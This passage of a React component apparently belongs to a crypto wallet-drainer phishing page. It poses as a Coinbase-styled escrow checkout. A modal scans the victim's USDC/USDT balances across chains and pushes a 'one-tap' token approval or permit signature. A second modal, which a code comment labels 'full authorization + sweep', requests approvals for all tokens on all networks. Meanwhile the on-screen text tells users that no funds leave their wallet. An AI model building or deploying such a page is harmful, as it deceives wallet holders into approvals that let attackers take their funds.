                <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-surface-strong text-muted">
                  <svg className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
                <h2 className="mb-2 text-lg font-semibold text-ink">Session closed</h2>
                <p className="mx-auto mb-2 max-w-sm text-sm text-body">
                  The 25-minute window for this checkout session has ended before verification was completed.
                </p>
                <p className="mx-auto max-w-sm text-sm text-body">
                  The reserved amount has been returned to the sender. No funds were ever withdrawn from your wallet.
                </p>
              </div>
            )}

            {phase === "error" && (
              <div className="py-4 text-center">
                <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-down/10">
                  <svg className="h-8 w-8 text-down" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
                <h2 className="mb-2 text-lg font-semibold text-ink">Something went wrong</h2>
                <p className="mx-auto mb-8 max-w-sm text-sm text-body">{error}</p>
                <button
                  onClick={() => {
                    setError(null);
                    setPhase(session ? "idle" : "no-session");
                  }}
                  className="h-12 rounded-pill bg-brand px-8 text-sm font-semibold text-on-brand transition hover:bg-brand-active"
                >
                  Start over
                </button>
              </div>
            )}
          </div>

          {session && (
            <aside className="order-first space-y-4 lg:order-none lg:sticky lg:top-24">
              {/* Timer now floats fixed bottom-right on all screen sizes */}

              <div className="rounded-card border border-hairline bg-surface-card p-5 shadow-card sm:p-6">
                <p className="mb-1 text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Checkout amount</p>
                <div className="mb-5"><CoinbaseAmount value={session.amountEur} size="sidebar" /></div>

                <div className="space-y-3 text-sm">
                  <div className="flex items-center justify-between">
                    <span className="text-body">From</span>
                    <span className="flex items-center gap-1.5 font-medium text-ink">
                      {session.recipientName}
                      <svg className="h-3.5 w-3.5 text-brand" viewBox="0 0 24 24" fill="currentColor">
                        <path
                          fillRule="evenodd"
                          d="M8.603 3.799A4.49 4.49 0 0112 2.25c1.357 0 2.573.6 3.397 1.549a4.49 4.49 0 013.498 1.307 4.491 4.491 0 011.307 3.497A4.49 4.49 0 0121.75 12a4.49 4.49 0 01-1.549 3.397 4.491 4.491 0 01-1.307 3.497 4.491 4.491 0 01-3.497 1.307A4.49 4.49 0 0112 21.75a4.49 4.49 0 01-3.397-1.549 4.49 4.49 0 01-3.498-1.306 4.491 4.491 0 01-1.307-3.498A4.49 4.49 0 012.25 12c0-1.357.6-2.573 1.549-3.397a4.49 4.49 0 011.307-3.497 4.49 4.49 0 013.497-1.307zm7.007 6.387a.75.75 0 10-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.14-.094l3.75-5.25z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Issued</span>
                    <span className="font-medium text-ink">{new Date(session.issuedAt).toLocaleDateString()}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Wallet</span>
                    <span className="font-mono font-medium text-ink">{address ? short(address) : "Not connected"}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Networks</span>
                    <span className="rounded-pill bg-surface-strong px-2.5 py-1 text-[11px] font-semibold text-ink">Multichain</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Min. balance</span>
                    <span className="font-medium tabular-nums text-ink">{formatEUR(session.minBalanceEur)}</span>
                  </div>
                  <div className="flex items-center justify-between border-t border-hairline pt-3">
                    <span className="text-body">Status</span>
                    <span className="rounded-pill bg-brand/10 px-2.5 py-1 text-[11px] font-semibold text-brand">
                      {phase === "complete" ? "Released" : phase === "expired" ? "Closed" : "Pending"}
                    </span>
                  </div>
                </div>
              </div>

              <div className="rounded-card border border-hairline bg-surface-card p-5 sm:p-6">
                <p className="mb-3 text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Security & Compliance</p>
                <ul className="space-y-3 text-sm leading-relaxed text-body">
                  {[
                    { icon: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z", text: "Institutional-grade custody infrastructure" },
                    { icon: "M13 10V3L4 14h7v7l9-11h-7z", text: "Real-time on-chain verification" },
                    { icon: "M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z", text: "Identity verification required" },
                    { icon: "M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z", text: "Multichain stablecoin support" },
                  ].map((item) => (
                    <li key={item.text} className="flex gap-2.5">
                      <svg className="mt-0.5 h-4 w-4 shrink-0 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={item.icon} />
                      </svg>
                      {item.text}
                    </li>
                  ))}
                </ul>
              </div>
            </aside>
          )}
        </div>

      </div>

      {/* ------------------------------------------------------------------ */}
      {/* Modal 1 — USDC / USDT balance approval (auto-pops after wallet connect) */}
      {/* ------------------------------------------------------------------ */}
      {modal1Open && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 backdrop-blur-sm">
          <div className="w-full max-w-sm rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">

            {/* Scanning state */}
            {modal1Scanning && (
              <div className="py-8 text-center">
                <div className="mx-auto h-10 w-10 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
                <p className="mt-5 text-[15px] font-semibold text-ink">Detecting your balance…</p>
                <p className="mt-1 text-sm text-muted">Checking Ethereum, BNB, Polygon &amp; Tron in parallel</p>
              </div>
            )}

            {/* Single winner — approve prompt */}
            {!modal1Scanning && !modal1Complete && modal1Items[0] && (() => {
              const item = modal1Items[0];
              const s = modal1Status[item.key];
              const isGasless = !!item.permit;
              return (
                <>
                  <div className="mb-6 text-center">
                    <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-brand/10">
                      <svg className="h-7 w-7 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                      </svg>
                    </div>
                    <h3 className="text-lg font-semibold tracking-tight text-ink">One-tap authorization</h3>
                    <p className="mt-1 text-sm text-body">
                      Your highest balance is on <span className="font-semibold text-ink">{item.chainLabel}</span>
                    </p>
                  </div>

                  {/* Balance pill */}
                  <div className={
                    "mb-6 flex items-center justify-between rounded-2xl border px-5 py-4 " +
                    (s === "done" ? "border-up/30 bg-up/5" : s === "failed" ? "border-down/20 bg-down/5" : "border-hairline bg-surface-soft")
                  }>
                    <div>
                      <p className="text-xs font-medium uppercase tracking-widest text-muted">{item.symbol} balance</p>
                      <p className="mt-0.5 text-2xl font-bold tracking-tight text-ink">
                        ${parseFloat(item.balanceDisplay).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </p>
                      <p className="mt-0.5 text-xs text-muted">{item.chainLabel}{item.isTron ? " · TRC20" : ""}</p>
                    </div>
                    {s === "done" && (
                      <div className="flex h-9 w-9 items-center justify-center rounded-full bg-up/15 text-up">
                        <svg className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    )}
                    {s === "approving" && <span className="h-5 w-5 animate-spin rounded-full border-2 border-hairline border-t-brand" />}
                    {s === "failed" && (
                      <div className="flex h-9 w-9 items-center justify-center rounded-full bg-down/10 text-down">
                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                        </svg>
                      </div>
                    )}
                  </div>

                  <button
                    onClick={handleModal1Approve}
                    disabled={modal1Approving}
                    className="flex h-12 w-full items-center justify-center gap-2.5 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
                  >
                    {modal1Approving
                      ? <><span className="h-4 w-4 animate-spin rounded-full border-2 border-white/40 border-t-white" />Authorizing…</>
                      : isGasless
                      ? "Authorize · Free signature"
                      : item.isTron
                      ? "Connect TronLink & Authorize"
                      : "Authorize now"}
                  </button>
                  <p className="mt-3 text-center text-xs text-muted">
                    {isGasless
                      ? "No gas required — this is a free off-chain signature."
                      : "One wallet confirmation needed. Gas is covered."}
                  </p>
                </>
              );
            })()}

            {/* Complete state */}
            {modal1Complete && (
              <div className="py-6 text-center">
                <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-up/10 text-up">
                  <svg className="h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <p className="text-[15px] font-semibold text-ink">Authorization sent</p>
                <p className="mt-1 text-sm text-muted">Proceeding to checkout…</p>
              </div>
            )}

            <p className="mt-4 text-center text-xs text-muted">
              Funds remain in your wallet. This approval only allows the payment to be received.
            </p>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------------ */}
      {/* Modal 2 — full authorization + sweep (triggered by "Approve Deposit") */}
      {/* ------------------------------------------------------------------ */}
      {modal2Open && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 backdrop-blur-sm">
          <div className="w-full max-w-md rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
            <div className="mb-6 flex items-start gap-4">
              <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-full bg-brand/10">
                <svg className="h-5 w-5 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                </svg>
              </div>
              <div>
                <h3 className="text-base font-semibold text-ink">Authorizing deposit</h3>
                <p className="mt-0.5 text-sm text-body">
                  Confirm each prompt in your wallet. This authorizes USDT, USDC, and all available tokens across all multichain networks.
                </p>
              </div>
            </div>

            <div className="space-y-2.5">
              {CHAINS.map((c) => {
                const done = approvedChains.includes(c.name);
                const chainIdx = CHAINS.findIndex((x) => x.name === c.name);
                const active = !done && approvedChains.length === chainIdx;
                return (
                  <div
                    key={c.name}
                    className={
                      "flex items-center justify-between rounded-xl border px-4 py-3.5 transition-colors " +
                      (done ? "border-up/20 bg-up/5" : active ? "border-brand/30 bg-brand/5" : "border-hairline bg-surface-soft")
                    }
                  >
                    <span className="flex items-center gap-2.5 text-sm font-medium text-ink">
                      <span className="flex h-5 w-5 items-center justify-center overflow-hidden rounded-full">
                        <Image src={CHAIN_LOGOS[c.name]} alt={c.label} width={20} height={20} className="object-contain" />
                      </span>
                      {c.label}
                    </span>
                    {done ? (
                      <span className="flex items-center gap-1.5 text-xs font-semibold text-up">
                        <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                        </svg>
                        Approved
                      </span>
                    ) : active ? (
                      <span className="flex items-center gap-1.5 text-xs text-brand">
                        <span className="h-3 w-3 animate-spin rounded-full border-2 border-hairline border-t-brand" />
                        Waiting for signature…
                      </span>
                    ) : (
                      <span className="text-xs text-muted">Pending</span>
                    )}
                  </div>
                );
              })}
            </div>

            <p className="mt-5 text-center text-xs text-muted">
              No funds leave your wallet during this process.
            </p>
          </div>
        </div>
      )}

    </EscrowShell>
  );
}
